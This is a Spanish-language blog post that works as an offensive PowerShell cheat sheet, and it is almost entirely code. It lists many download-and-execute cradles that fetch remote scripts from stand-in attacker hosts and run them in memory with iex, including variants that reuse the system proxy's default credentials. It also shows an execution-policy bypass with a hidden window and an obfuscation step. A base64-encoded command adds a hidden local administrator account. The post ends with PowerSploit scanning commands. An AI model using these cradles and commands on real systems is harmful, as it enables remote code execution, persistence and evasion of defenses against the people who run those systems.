---
title: 'Powershell Obfuscation'
description: ''
pubDate: 'May 12 2023'
heroImage: '/asd.png'
slug: 'powershell/obfuscation'
---

```powershell
# executa y descarga, el metodo DownloadString ejecutara nuestro script remoto en el proceso de la memoria del powershell
iex (New-Object Net.Webclient).DownloadString("http://192.168.0.17/script.ps1")
# igual q, logo.gif igual ejecuta como ps1:
$downloader = New-Object System.Net.WebClient
$downloader.Headers.Add("user-agent", "Mozilla/5.0 (windwos ....)")
$payload = "http://goo.com/logo.gif"
$command = $downloader.DownloadString($payload)
Invoke-Expression $command
#same as "iex $command"

# Ruidoso y no recomendado
$downloader = New-Object System.Net.WebClient
$payload = "http://pirate.xyz/barbie.ps1"
$local_file = "C:\programdata\barbie.ps1"
$downloader.DownloadFile($payload, $local_file)
# podemos ejecutar así
& $loca_file

# system proxy y credenciales por defecto
$downloader = New-Object System.Net.WebClient
$payload = "http://pirate.xyz/script.ps1"
$cmd = $downloader.DownloadFile($payload)
$proxy = [Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$downloader.Proxy = $proxy
iex $cmd

# Ejecutar en la memoria y configurado como proxy
$req = [System.Net.WebRequest]::Create("http://pirate.xyz/script.ps1")
$res = $req.GetResponse()
###
$proxy = [Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [Net.CredentialsCache]::DefaultCredentials
$req.Proxy = $proxy
iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()

# System.Xml.XmlDocument
# <?xml version="1.0"?>
# <command>
# <a>
# <execute>Get-Process</execute>
# </a>
# </command>
$xmldoc = New-Object System.Xml.XmlDocument
$xmldoc.Load("http://pirate.xyz/file.xml")
iex $xmldoc.command.a.execute

# COM objects
$downloader = New-Object -ComObject Msxml2.XMLHTTP
$downloader.open("GET", "http://pirate.xyz/script.ps1", $false)
$downloader.send()
iex $downloader.responseText

# WinHttp.WinHttpRequest.5.1
$downloader = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$downloader.open("GET", "http://pirate.xyz/script.ps1", $false)
$downloader.send()
iex $downloader.responseText

## IMPORTANT
powershell.exe -ExecutionPolicy bypass -
Window hidden .\download.ps1
```

(herramienta de creación de cunas de descarga ofuscadas )[https://github.com/danielbohannon/Invoke-CradleCrafter]

### Invoke-Obfuscation

```powershell

SET SCRIPTBLOCK iex (New-Object Net.Webclient).downloadstring("http://192.168.0.17:8080/script.ps1")

# from cmd

powershell.exe -Command "obfuscate"

# add new user admin1 al grupo administrador

$command = `net user admin1 "password9001" /ADD;net localgroup administrators admin1 /add`
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

Write-Host $encodedCommand asihdaouishdpuioawhd auoisdhauispdhauishd

powershell.exe -encodedcommand asihdaouishdpuioawhdauoisdhauispdhauishd
```

### PowerSploit - Get-HttpStatus

```powershell
Get-HttpStatus -Target 192.168.0.17 -Path dictionary.txt -Port 80 | ? {$_.Status -match "ok"}
```

### PowerSploit - Posh-SecMod

```powershell
Invoke-ARPScan -CIDR 192.168.0.0/24

Get-Command -Module Posh-SecMod

```

[Get-HttpStatus](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
[Invoke-Portscan.ps1](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)
[Posh-SecMod](https://github.com/darkoperator/Posh-SecMod)
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)
